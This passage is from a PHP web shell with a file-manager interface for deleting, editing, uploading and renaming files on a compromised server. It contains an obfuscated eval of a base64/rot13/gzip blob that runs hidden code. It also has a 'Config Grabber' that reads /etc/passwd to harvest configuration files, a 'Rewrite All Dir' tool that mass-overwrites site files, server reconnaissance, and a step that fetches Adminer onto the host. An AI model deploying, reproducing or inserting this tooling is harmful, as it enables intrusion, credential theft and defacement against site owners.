                        jqxAlert.alert('maintenance');
                    })">
                        <div class="icon">
                            <a><i class="fa fa-info-circle" aria-hidden="true"></i></a>
                        </div>
                        <div class="font">
                            About me
                        </div>
                    </button>
                </li>
                <li>
                    <button>
                        <div class="icon">
                            <a><i class="fa fa-power-off" aria-hidden="true"></i></a>
                        </div>
                        <div class="font">
                            Logout
                        </div>
                    </button>
                </li>
                <input type="hidden" name="file" value="<?= $dir['name'] ?>">
            </form>
        </ul>
        <div class="mobile">
            <input class="<?= $class ?>" type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name">
        </div>
    </div>
    <?php
}
function alert($message)
{
    ?>
    <script type="text/javascript">
        $(document).ready(function () {
            jqxAlert.alert('<?= $message ?>');
        })
   </script>
    <?php
}  eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
?>
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
<style type="text/css">
    @import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
    body {
        background: #e2e1e0;
        color: #292929;
        overflow: hidden;
        margin: 0;
        margin-top: 10px;
    }
    * {
        font-family: 'Open Sans', sans-serif;
    }
    .count {
        font-size:10px;

        z-index: 99999;
        text-align: center;
        padding:10px;
        padding-left:15px;
    }
    .count span {
        font-family: 'Open Sans', sans-serif;

    }
    .count select {
        padding:7px;
        width:100%;
        border-radius: 5px;
        border: 1px solid #ebebeb;
        background: #ebebeb;
        outline: none;
    }
    .all {
        display: inline-block;
        width:150px;
        text-align: left;
    }
    .select {
        width:270px;
        display: inline-block;
    }
    .total {
        width:150px;
        text-align: right;
        display: inline-block;
    }
    .back .mobile {
        padding-left:25px;
        width:98%;
        padding-bottom:10px;
    }
    .storage {
        margin-top:7px;
        box-shadow: 0px 2px 2px 0px #e0e0e0;
        padding:25px;
        padding-bottom:10px;
    }
    .storage span {
        color: #666;
    }
    .storage span.title {
        color: #000;
        font-size: 23px;
        font-weight:bold;
    }
    .storage span:nth-child(7),
    .storage span:nth-child(5),
    .storage span:nth-child(6),
    .storage span:nth-child(4) {
        font-size: 10px;
    }
    .storage span:nth-child(3) {
        font-size: 10px;
    }
    .back {
        font-weight: bold;
        padding:20px;
        font-size: 20px;
        padding-bottom: 10px;
    }
    .back input[type=text] {
        float: right;
        padding:7px;
        margin-right:20px;
        width:100%;
        border-radius: 5px;
        border: 1px solid #ebebeb;
        background: #ebebeb;
        outline: none;
    }
    .hidden {
        display: none;
    }
    .back button {
        background: none;
        font-size: 23px;
        border: none;
        margin-top:-10px;
        outline: none;
        float: right;
    }
    .back button:hover {
        cursor: pointer;
    }
    .back .dirname {
        position: absolute;
        margin-top:-7px;
        max-width:510px;
        display: inline-block;
        margin-left: 20px;
        font-size: 23px;
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
    }
    .back a {
        background: #fff;
        color: #000;
        font-weight: bold;
        border-radius:10px;
        padding: 5px;
        padding-left: 7px;
        padding-right: 10px;
    }
    .files {
        box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
        overflow: hidden;
        text-align: left;
        border-radius:10px;
        height:625px;
        background: #fff;
        width:50%;
    }
    .table {
        overflow-y: auto;
        padding-bottom:20px;
        padding-top:20px;
        padding-left:20px;
        padding-right: 20px;
        overflow-x: hidden;
        height:420px;

    }
    .rewrite-success {
        background: #6dc900;
        padding:5px;
        color: #fff;
        border-radius: 7px;
        margin-bottom:5px;
    }
    .rewrite-failed {
        background: #c90606;
        padding:5px;
        color: #fff;
        border-radius: 7px;
        margin-bottom:5px;
    }
    .rewrite-success span {
        float: right;
    }
    .rewrite-failed span {
        float: right;
    }
    .rewrite {
        height:555px;
        overflow: auto;
    }
    .adminer {
        text-align: center;
        padding-left: 25px;
        padding-right: 25px;
        display: block;
    }
    .adminer span {
        font-size:20px;
    }
    .adminer a {
        background: #53c41b;
        padding:10px;
        padding-left:50px;
        padding-right: 50px;
        border-radius:7px;
        color: #fff;
    }
    .rename .rename_name {
        max-width:500px;
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
    }
    .edit .editname {
        max-width:500px;
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
    }
    .info,
    .config,
    .rewrite,
    .addfile,
    .adddir,
    .upload,
    .rename,
    .edit {
        padding-left: 25px;
        padding-right: 25px;
    }
    .info table {
        width:100%;
        overflow: hidden;
        word-break:break-all;
    }
    .info table td.info {
        width:125px;
    }
    .info .engine {
        width:auto;
        overflow-x: auto;
    }
    .info table td,
    .config table td,
    .rewrite table td,
    .addfile table td,
    .adddir table td,
    .upload table td,
    .rename table td,
    .edit table td {
        padding-top:10px;
        padding-bottom: 10px;
    }
    .rename button,
    .edit button {
        border-radius: 5px;
        font-size: 15px;
        background: #e7f3ff;
        font-weight: bold;
        border: 1px solid #e7f3ff;
        color: #1889f5;
        outline: none;
        padding: 5px;
        padding-left:10px;
        padding-right: 10px;
    }
    .rename button:hover,
    .edit button:hover {
        cursor: pointer;
    }
    .config input[type=submit],
    .rewrite input[type=submit],
    .addfile input[type=submit],
    .adddir input[type=submit],
    .upload input[type=submit],
    .rename input[type=submit],
    .edit input[type=submit] {
        width: 100%;
        border-radius: 5px;
        font-size: 18px;
        background: #e7f3ff;
        outline: none;
        border: 1px solid #e7f3ff;
        color: #1889f5;
        font-weight: bold;
        padding: 5px;
    }
    textarea {
        width: 100%;
        height:270px;
        border-radius: 10px;
        border: 1px solid #ebebeb;
        background: #ebebeb;
        outline: none;
        padding:20px;
        resize: none;
    }
    input[type=text] {
        padding:10px;
        width:100%;
        border-radius: 5px;
        border: 1px solid #ebebeb;
        background: #ebebeb;
        outline: none;
    }
    table {
        width: 100%;
        border-spacing: 0;
    }
    td {
        border-radius:5px;
    }
    table td.border1 {
        border-top-left-radius: 5px;
        border-top-right-radius:0px;
        border-bottom-left-radius: 5px;
        border-bottom-right-radius:0px;
    }
    table td.border2 {
        border-top-left-radius: 0px;
        border-top-right-radius:5px;
        border-bottom-left-radius: 0px;
        border-bottom-right-radius:5px;
    }
    .hover {
        transition: all 0.35s;
    }
    .hover:hover {
        background: #efefef;
    }
    .block {
        clear: both;
        min-height: 50px;
        border-top: solid 1px #ECE9E9;
    }
    .block:first-child {
        border: none;
    }
    .block .img img {
        width: 50px;
        height: 50px;
        display: block;
        float: left;
        margin-right: 10px;
    }
    .block .name {
        display: inline-block;
        max-width:480px;
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
    }
    .block .date {
        margin-top: 4px;
        font-size: 70%;
        color: #666;
    }
    .block .date .dir-size,
    .block .date .file-size {
        min-width:90px;
        display: inline-block;
    }
    .block .date .dir-perms,
    .block .date .file-perms {
        min-width:100px;
        display: inline-block;
    }
    .block .date .dir-time,
    .block .date .file-time {
        min-width:150px;
        display: inline-block;
    }
    .block .date .dir-owner,
    .block .date .file-owner {
        min-width:100px;
        display: inline-block;
    }
    .block a {
        border-radius:5px;
        display: block;
        color: #292929;
        padding-top: 8px;
        padding-bottom: 13px;
        padding-left:5px;
        transition: all 0.35s;
    }
    .block a:hover {
        text-decoration: none;
    }
    a {
        color: #000;
        text-decoration: none;
    }
    nav {
        float: right;
        position: relative;
    }
    .dropdown-toggle {
        border: 1px solid #ebebeb;
        background: #ebebeb;
        outline: none;
        padding: .5em 1em;
        border-radius: .3em;
        transition: all 0.35s;
    }
    .dropdown-toggle:hover {
        cursor: pointer;
        background: #d6d6d6;
    }
    .toggle {
        padding:10px;
        border: 1px solid #ebebeb;
        background: #ebebeb;
        margin-bottom: 3px;
    }
    ul.dropdown {
        display: none;
        position:absolute;
        z-index: 5;
        margin-top: .5em;
        background: #fff;
        box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
        margin-left:-190px;
        margin-top: -24px;
        min-width: 12em;
        padding: 0;
        border-radius:7px;
    }
    ul.dropdown li {
        list-style-type: none;
    }
    ul.dropdown li button {
        text-align: left;
        outline: none;
        color: #000;
        width: 100%;
        font-size:18px;
        background: none;
        border: none;
        text-decoration: none;
        padding: .5em 1em;
        display: block;
    }
    ul.dropdown li:nth-child(1) button:nth-child(1) {
        border-radius:7px 7px 0px 0px;
    }
    ul.dropdown li a {
        text-align: left;
        outline: none;
        color: #000;
        border-radius:7px 7px 0px 0px;
        width: 81%;
        font-size:18px;
        background: none;
        border: none;
        text-decoration: none;
        padding: .5em 1em;
        display: block;
    }
    ul.dropdown li a:hover,
    ul.dropdown li button:hover {
        cursor: pointer;
        text-decoration: none;
        background: #efefef;
    }

    ul.dropdown-tool {
        background: #fff;
        display: none;
        position: absolute;
        z-index: 5;
        box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
        margin-left:310px;
        margin-top: .5em;
        min-width: 10em;
        padding-top:10px;
        padding-left:0;
        border-radius:7px;
    }
    ul.dropdown-tool li {
        list-style-type: none;
    }
    ul.dropdown-tool li button {
        text-align: left;
        outline: none;
        color: #000;
        width: 100%;
        font-size:18px;
        background: none;
        font-weight:bold;
        border: none;
        text-decoration: none;
        padding: .5em 1em;
        display: block;
    }
    ul.dropdown-tool li button div.icon {
        width:35px;
        display: inline-block;
        text-align: left;
    }
    ul.dropdown-tool li button div.icon a {
        margin-right:-30px;
        background: none;
    }
    ul.dropdown-tool li button div.font {
        display: inline-block;
    }
    ul.dropdown-tool li:nth-child(1) button:nth-child(1) {
        border-radius:7px 7px 0px 0px;
    }
    ul.dropdown-tool li:nth-child(2) button:nth-child(2) {
        border-radius:0px 0px 7px 7px;
        background: red;
    }
    ul.dropdown-tool li button:hover {
        cursor: pointer;
        display: inline-block;
        text-decoration: none;
        background: #e7f3ff;
        color: #1889f5;
    }
    ::-webkit-scrollbar {
        width: 12px;
    }
    ::-webkit-scrollbar-track {
        background: #fff;
    }
    ::-webkit-scrollbar-thumb {
        background: #ebebeb;
        border-radius: 20px;
        border:3px solid #fff;
    }
    ::-webkit-scrollbar-thumb:hover {
        background: #dfeaf5;
    }
    .jqx-alert  {
        margin-top: -200px;
        position: absolute;
        overflow: hidden;
        border-radius:10px;
        box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
        z-index: 99999;
     }
    .jqx-alert-header   {
        font-weight: bold;
        min-width:300px;
        outline: none;
        border-radius:10px 10px 0px 0px;
        overflow: hidden;
        padding: 10px;
        padding-left:20px;
        font-size:25px;
        white-space: nowrap;
        overflow: hidden;
        background-color:#fff;
    }
    .jqx-alert-content   {
        border-radius:0px 0px 10px 10px;
        outline: none;
        height:100px;
        overflow: auto;
        height:auto;
        max-width:300px;
        text-align: left;
        background-color: #fff;
        word-break: break-all;
        padding: 20px;
        padding-top:10px;
        border: 1px solid #fff;
        border-top: none;
    }
    #alert_button {
        font-weight: bold;
        color: #292929;
        border: 1px solid #ebebeb;
        background: #ebebeb;
        border-radius:5px;
        margin-top: 45px;
        outline: none;
        width:100%;
        padding: 7px;
    }
    .blocker {
        position: fixed;
        top: 0; right: 0; bottom: 0; left: 0;
        width: 100%; height: 100%;
        overflow: auto;
        z-index: 1;
        padding: 20px;
        box-sizing: border-box;
        text-align: center;
    }
    .blocker:before{
        content: "";
        display: inline-block;
        height: 100%;
        vertical-align: middle;
        margin-right: -0.05em;
    }
    .blocker.behind {
        background-color: transparent;
    }
    .modal-rename {
        display: none;
        vertical-align: middle;
        position: relative;
        z-index: 2;
        max-width:500px;
        box-sizing: border-box;
        background: #fff;
        -webkit-border-radius: 7px;
        -moz-border-radius: 7px;
        -o-border-radius: 7px;
        -ms-border-radius: 7px;
        border-radius: 7px;
        box-shadow: 0 3px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
        text-align: left;
    }
    .modal-rename input,
    .modal-rename button {
        margin-bottom:3px;
        width:100%;
    }
    .modal {
        display: none;
        vertical-align: middle;
        position: relative;
        z-index: 2;
        min-width:350px;
        max-width:500px;
        box-sizing: border-box;
        background: #fff;
        -webkit-border-radius: 7px;
        -moz-border-radius: 7px;
        -o-border-radius: 7px;
        -ms-border-radius: 7px;
        border-radius: 7px;
        box-shadow: 0 3px 6px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
        text-align: left;
    }
    .modal video {
        width:100%;
        outline: none;
        border-radius: 7px;
    }
    .modal audio {

        outline: none;
        background: #fff;
    }
    .modal img {
        border-radius: 7px;
        width:100%;
    }
    .modal a.close-modal {
        position:absolute;
        top:-12.5px;
        right:-12.5px;
        display:block;
        width:30px;
        height:30px;
        text-indent:-9999px;
        background-size:contain;
        background-repeat:no-repeat;
        background-position:center center;
        background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAAXNSR0IArs4c6QAAA3hJREFUaAXlm8+K00Acx7MiCIJH/yw+gA9g25O49SL4AO3Bp1jw5NvktC+wF88qevK4BU97EmzxUBCEolK/n5gp3W6TTJPfpNPNF37MNsl85/vN/DaTmU6PknC4K+pniqeKJ3k8UnkvDxXJzzy+q/yaxxeVHxW/FNHjgRSeKt4rFoplzaAuHHDBGR2eS9G54reirsmienDCTRt7xwsp+KAoEmt9nLaGitZxrBbPFNaGfPloGw2t4JVamSt8xYW6Dg1oCYo3Yv+rCGViV160oMkcd8SYKnYV1Nb1aEOjCe6L5ZOiLfF120EjWhuBu3YIZt1NQmujnk5F4MgOpURzLfAwOBSTmzp3fpDxuI/pabxpqOoz2r2HLAb0GMbZKlNV5/Hg9XJypguryA7lPF5KMdTZQzHjqxNPhWhzIuAruOl1eNqKEx1tSh5rfbxdw7mOxCq4qS68ZTjKS1YVvilu559vWvFHhh4rZrdyZ69Vmpgdj8fJbDZLJpNJ0uv1cnr/gjrUhQMuI+ANjyuwftQ0bbL6Erp0mM/ny8Fg4M3LtdRxgMtKl3jwmIHVxYXChFy94/Rmpa/pTbNUhstKV+4Rr8lLQ9KlUvJKLyG8yvQ2s9SBy1Jb7jV5a0yapfF6apaZLjLLcWtd4sNrmJUMHyM+1xibTjH82Zh01TNlhsrOhdKTe00uAzZQmN6+KW+sDa/JD2PSVQ873m29yf+1Q9VDzfEYlHi1G5LKBBWZbtEsHbFwb1oYDwr1ZiF/2bnCSg1OBE/pfr9/bWx26UxJL3ONPISOLKUvQza0LZUxSKyjpdTGa/vDEr25rddbMM0Q3O6Lx3rqFvU+x6UrRKQY7tyrZecmD9FODy8uLizTmilwNj0kraNcAJhOp5aGVwsAGD5VmJBrWWbJSgWT9zrzWepQF47RaGSiKfeGx6Szi3gzmX/HHbihwBser4B9UJYpFBNX4R6vTn3VQnez0SymnrHQMsRYGTr1dSk34ljRqS/EMd2pLQ8YBp3a1PLfcqCpo8gtHkZFHKkTX6fs3MY0blKnth66rKCnU0VRGu37ONrQaA4eZDFtWAu2fXj9zjFkxTBOo8F7t926gTp/83Kyzzcy2kZD6xiqxTYnHLRFm3vHiRSwNSjkz3hoIzo8lCKWUlg/YtGs7tObunDAZfpDLbfEI15zsEIY3U/x/gHHc/G1zltnAgAAAABJRU5ErkJggg==')
    }
    .close {
        position: absolute;
        top: -20px;
        right: -20px;
        border:none;
        box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
        border-radius: 50%;
        background-color: #FFF;
        color: #F08;
        padding: 10px 18px;
        font-size: 1em;
        outline: none;
        cursor: pointer;
        transition: all 0.3s ease-in-out;
    }
    .close:hover {
        background-color: #F08;
        color: #FFF;
    }
    .box > h2 {
        text-align: left;
    }
    @media (min-width: 320px) and (max-width: 480px) {
        body {
            background: #fff;
            margin: 0;
        }
        ::-webkit-scrollbar {
            display: none;
        }
        .mobile {
            padding-left:25px;
            width:98%;
        }
        .table {
            height:440px;
        }
        .files {
            box-shadow: none;
            border-radius:0;
            width:100%;
            height:650px;
        }
        .block .date .dir-size,
        .block .date .file-size {
            min-width:55px;
            display: inline-block;
        }
        .block .date .dir-perms,
        .block .date .file-perms {
            min-width:70px;
            display: inline-block;
        }
        .block .date .dir-time,
        .block .date .file-time {
            display: none;
        }
        .block .date .dir-owner,
        .block .date .file-owner {
            min-width:70px;
            text-align: center;
            display: inline-block;
        }
        .back input[type=text] {
            width: 100%;
        }
        .group {
            display: none;
        }
        .block .name {
            max-width:200px;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
        }
        .back .dirname {
            max-width:225px;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
        }
        ul.dropdown-tool {
            background: #fff;
            margin-left:115px;
            margin-top: 8px;
            min-width: 10em;
        }
        .all {
            width:100px;
        }
        .select {
            width:100px;
        }
        .total {
            width:100px;
        }
        .rename .rename_name {
            max-width:220px;
        }
        .edit .editname {
            max-width:220px;
        }
    }
</style>
<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-modal/0.9.1/jquery.modal.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script type="text/javascript">
    $(function() {
        $('.dropdown-toggle').click(function(){
            $(this).next('.dropdown').toggle();
        });
        $(document).click(function(e) {
            var target = e.target;
            if (!$(target).is('.dropdown-toggle') && !$(target).parents().is('.dropdown-toggle')) {
                $('.dropdown').hide();
            }
        });
    });
</script>
<script type="text/javascript">
    $(function() {
        $('.dropdown-toggle').click(function(){
            $(this).next('.dropdown-tool').toggle();
        });
        $(document).click(function(e) {
            var target = e.target;
            if (!$(target).is('.dropdown-toggle') && !$(target).parents().is('.dropdown-toggle')) {
                $('.dropdown-tool').hide();
            }
        });
    });
    var max_fields = 10;
    var x = 1;
    $(document).on('click', '#add_input', function(e){
        if(x < max_fields){
            x++;
            $('#output').append('<div id=\"out\"><input type=\"text\" name=\"filename[]\"><a href="#" class=\"remove\">remove</a></div></div></div>');
        }
        $('#output').on("click",".remove", function(e){
            e.preventDefault(); $(this).parent('#out').remove(); x--;
            repeat();
        })
    });
</script>
<script>
function filterTable() {
    var input, filter, table, tr, td, i;
    input = document.getElementById("Input");
    filter = input.value.toUpperCase();
    table = document.getElementById("myTable");
    tr = table.getElementsByTagName("tr");
    for (i = 0; i < tr.length; i++) {
        td = tr[i].getElementsByTagName("td")[0];
        if (td) {
            if (td.innerHTML.toUpperCase().indexOf(filter) > -1) {
                tr[i].style.display = "";
            } else {
                tr[i].style.display = "none";
            }
        }
    }
}
</script>
<script type="text/javascript">
 $(document).ready(function() {
     $(".open").on("click", function() {
       $(".container").fadeIn();
       $(".open").fadeOut();
     });

     $(".close").on("click", function() {
       $(".container").fadeOut();
       $(".open").fadeIn();
     });
 });
</script>
<script type="text/javascript">
    jqxAlert = {
        top: 0,
        left: 0,
        overlayOpacity: 0.2,
        overlayColor: 'rgba(0, 0, 0, 0.3)',
        alert: function (message, title) {
            if (title == null) title = 'Alert !';
            jqxAlert._show(title, message);
        },
        _show: function (title, msg) {
            jqxAlert._hide();
            jqxAlert._handleOverlay('show');
            $("BODY").append(
                      '<div class="jqx-alert" id="alert_container">' +
                      '<div id="alert_title"></div>' +
                      '<div id="alert_content">' +
                      '<div id="message"></div>' +
                      '<input type="button" value="OK" id="alert_button"/>' +
                      '</div>' +
                      '</div>');
            $("#alert_title").text(title);
            $("#alert_title").addClass('jqx-alert-header');
            $("#alert_content").addClass('jqx-alert-content');
            $("#message").text(msg);
            $("#alert_button").click(function () {
                jqxAlert._hide();
            });
            jqxAlert._setPosition();
        },
        _hide: function () {
            $("#alert_container").remove();
            jqxAlert._handleOverlay('hide');
        },
        _handleOverlay: function (status) {
            switch (status) {
                case 'show':
                jqxAlert._handleOverlay('hide');
                $("BODY").append('<div id="alert_overlay"></div>');
                $("#alert_overlay").css({
                    position: 'absolute',
                    zIndex: 99998,
                    top: '0px',
                    left: '0px',
                    width: '100%',
                    height: $(document).height(),
                    background: jqxAlert.overlayColor,
                    opacity: jqxAlert.overlayOpacity
                });
                break;
           case 'hide':
                $("#alert_overlay").remove();
                break;
            }
        },
        _setPosition: function () {
            var top = (($(window).height() / 2) - ($("#alert_container").outerHeight() / 2)) + jqxAlert.top;
            var left = (($(window).width() / 2) - ($("#alert_container").outerWidth() / 2)) + jqxAlert.left;
            if (top < 0) {
                top = 0;
            }
            if (left < 0) {
                left = 0;
            }
            $("#alert_container").css({
                top: top + 'px',
                left: left + 'px'
            });
            $("#alert_overlay").height($(document).height());
        }
    }
</script>
<center>
<div class="files">
    <?php
    switch (@$_POST['action']) {
        case 'delete':
            if (XN::delete($_POST['file'])) {
                alert("" . basename($_POST['file']) . " Deleted");
            } else {
                alert("Permission Danied");
            }
            break;
        case 'info':
            head('Server Info', getcwd(), 'hidden'); ?>
            <div class="info">
                <table>
                    <tr>
                        <td class="info">
                            Kernel
                        </td>
                        <td>:</td>
                        <td>
                            <div class="engine">
                                <?= XN::info('kernel') ?>
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td class="info">
                            Software
                        </td>
                        <td>:</td>
                        <td>
                            <div class="engine">
                                <?= XN::info('software') ?>
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td class="info">
                            IP
                        </td>
                        <td>:</td>
                        <td>
                            <div class="engine">
                                <?= XN::info('ip') ?>
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td class="info">
                            PHP Version
                        </td>
                        <td>:</td>
                        <td>
                            <div class="engine">
                                <?= XN::info('phpversion') ?>
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td class="info">
                            Domains
                        </td>
                        <td>:</td>
                        <td>
                            <div class="engine">
                                <?= XN::info('domain') ?>
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td class="info">
                            Disable Function
                        </td>
                        <td>:</td>
                        <td>
                            <div class="engine">
                                <?= XN::info('disable_function') ?>
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td class="info">
                            Safe Mode
                        </td>
                        <td>:</td>
                        <td>
                            <div class="engine">
                                <?= XN::info('safe_mode') ?>
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td class="info" colspan="3">
                            <?= XN::info('lib') ?>
                        </td>
                    </tr>
                </table>
            </div>
            <?php
            exit();
            break;

        case 'backup':
            if (
                XN::save(
                    $_POST['file'] . ".bak",
                    file_get_contents($_POST['file'])
                )
            ) {
                alert('failed');
            } else {
                alert("" . basename($_POST['file']) . " has been backup !");
            }
            break;
        case 'adminer':
            head('Adminer', getcwd(), 'hidden');
            if (file_exists('adminer.php')) { ?>
                <div class="adminer">
                    <a href="adminer.php" target="_blank">Login Adminer</a>
                </div>
                <?php } else {if (
                    XN::adminer(
                        'https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php',
                        'adminer.php'
                    )
                ) { ?>
                    <div class="adminer">
                        <span>
                            Successfully created Adminer.php
                        </span><br><br>
                        <a href="adminer.php" target="_blank">Login Adminer</a>
                    </div>
                    <?php }}
            exit();
            break;
        case 'config':
            head('Config Grabber', getcwd(), 'hidden'); ?>
            <div class="config">
                <table>
                    <form method="post">
                        <tr>
                            <td>
                                <textarea name="passwd"><?= include '/etc/passwd' ?></textarea>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input type="submit" name="grab" value="Grab">
                                <input type="hidden" name="action" value="config">
                            </td>
                        </tr>
                    </form>
                </table>
            </div>
            <?php
            if (XN::OS() == 'Windows') {
                die(alert('Just for Linux server'));
            }
            if (isset($_POST['grab'])) {
                if (XN::config($_POST['passwd'])) {
                    alert("failed");
                } else {
                    alert("success");
                }
            }
            exit();
            break;

        case 'rewrite':
            head('Rewrite All Dir', getcwd(), 'hidden'); ?>
            <div class="rewrite">
                <table>
                    <form method="post">
                        <tr>
                            <td>
                                <input type="text" name="dir" value="<?= $_SERVER[
                                    'DOCUMENT_ROOT'
                                ] ?>">
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input type="text" name="ext[]" placeholder="ext: php html txt">
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <textarea name="text"></textarea>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input type="submit" name="rewrite" value="Start">
                                <input type="hidden" name="action" value="rewrite">
                            </td>
                        </tr>
                    </form>
                </table>
                <?php if (isset($_POST['rewrite'])) {
                    for ($i = 0; $i < count($_POST['ext']); $i++) {
                        $plod = explode(" ", $_POST['ext'][$i]);
                        foreach ($plod as $data) {
                            if ($data) { ?>
                            <tr>
                                <td>
                                    <b><?= $data ?></b>
                                </td>
                            </tr>
                            <?php XN::rewrite(
                                $_POST['dir'],
                                $data,
                                $_POST['text']
                            );}
                        }
                    }
                } ?>
                </div>
                <?php
                exit();
                break;

        case 'adddir':

            if (isset($_POST['adddir'])) {
                $dirname = $_POST['dirname'];
                for ($i = 0; $i < count($dirname); $i++) {
                    $explode = explode(' ', $dirname[$i]);
                    foreach ($explode as $value) {
                        if (XN::addfolder($value)) {
                            alert('failed');
                        } else {
                            alert("success");
                        }
                    }
                }
            }
            head('Add Folder', getcwd(), 'hidden');
            ?>
            <div class="adddir">
                <table>
                    <form method="post">
                        <tr>
                            <td>
                                <input type="text" name="dirname[]" placeholder="dirname">
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input type="submit" name="adddir">
                                <input type="hidden" name="action" value="adddir">
                            </td>
                        </tr>
                    </form>
                </table>
            </div>
            <?php
            exit();
            break;

        case 'addfile':

            if (isset($_POST['addfile'])) {
                XN::addfile($_POST['filename'], $_POST['data']);
            }
            head('Add File', getcwd(), 'hidden');
            ?>
            <div class="addfile">
                <table>
                    <form method="post">
                        <tr>
                            <td>
                                <input type="text" name="filename[]" placeholder="filename">
                            </td>
                            <td style="display: none;"><a id="add_input">add</a></td>
                        </tr>
                        <tr>
                            <td style="display: none;">
                                <div id="output"></div>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <textarea style="height:400px;" name="data" placeholder="your code"></textarea>
                            </td>
                        </tr>
                        <tr>
                            <td>
                                <input type="submit" name="addfile">
                                <input type="hidden" name="action" value="addfile">
                            </td>
                        </tr>
                    </form>
                </table>
            </div>
            <?php
            exit();
            break;

        case 'upload':
            head('Upload', getcwd(), 'hidden'); ?>
            <div class="upload">
                <table>
                    <form method="post" enctype="multipart/form-data">
                        <tr>
                            <td>
                                <input type="file" name="file[]" multiple>
                            </td>
                            <td>
                                <input type="submit" name="upload">
                            </td>
                        </tr>
                        <input type="hidden" name="action" value="upload">
                    </form>
                </table>
            </div>
            <?php
            if (isset($_POST['upload'])) {
                $files = count($_FILES['file']['tmp_name']);
                for ($i = 0; $i < $files; $i++) {
                    if (
                        copy(
                            $_FILES['file']['tmp_name'][$i],
                            $_FILES['file']['name'][$i]
                        )
                    ) { ?>
                        <?= $_FILES['file']['name'][$i] ?>
                    <?php } else {alert('Upload failed !');}
                }
            }
            exit();
            break;

        case 'rename':
            if (
                @rename(
                    $_POST['file'],
                    getcwd() . DIRECTORY_SEPARATOR . $_POST['newname']
                )
            ) {
                print "<script>window.location='?x=" . getcwd() . "'</script>";
            } else {
                print "<script>window.location='?x=" .
                    getcwd() .
                    "&failed=Rename'</script>";
            }
            exit();
        case 'edit':

            if (isset($_POST['save'])) {
                if (XN::save($_POST['file'], $_POST['data'])) {
                    alert("Permission Danied");
                } else {
                    alert("success");
                }
            }
            head("Edit", getcwd(), 'hidden');
            ?>
            <div class="edit">
                <table>
                    <tr>
                        <td>
                            Filename
                        </td>
                        <td>:</td>
                        <td>
                            <div class="editname">
                                <?= XN::wr(
                                    basename($_POST['file']),
                                    basename($_POST['file']),
                                    2
                                ) ?>
                            </div>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            Size
                        </td>
                        <td>:</td>
                        <td>
                            <?= XN::size($_POST['file']) ?>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            Last Modif
                        </td>
                        <td>:</td>
                        <td>
                            <?= XN::ftime($_POST['file']) ?>
                        </td>
                    </tr>
                    <tr>
                        <form method="post">
                            <td colspan="3">
                                <button disabled>Edit</button>
                                <button name="action" value="delete">Delete</button>
                                <button name="action" value="rename">Rename</button>
                                <button name="action" value="backup">Backup</button>
                            </td>
                            <input type="hidden" name="file" value="<?= $_POST[
                                'file'
                            ] ?>">
                        </form>
                    </tr>
                    <form method="post">
                        <tr>
                            <td colspan="3">
                                <textarea name="data"><?= htmlspecialchars(
                                    file_get_contents($_POST['file'])
                                ) ?></textarea>
                            </td>
                        </tr>
                        <tr>
                            <td colspan="3">
                                <input type="submit" name="save" value="SAVE">
                                <input type="hidden" name="file" value="<?= $_POST[
                                    'file'
                                ] ?>">
                                <input type="hidden" name="action" value="edit">
                            </td>
